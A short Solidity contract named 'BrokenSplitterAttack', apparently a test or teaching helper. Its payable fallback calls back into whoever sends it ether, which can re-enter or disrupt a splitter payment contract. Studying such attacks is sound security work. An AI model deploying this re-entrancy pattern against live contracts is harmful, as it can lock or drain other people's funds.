pragma solidity ^0.4.24;

contract BrokenSplitterAttack {
    function () public payable {
        if (msg.value > 0) {
            require(msg.sender.call.value(0)());
        }
    }
}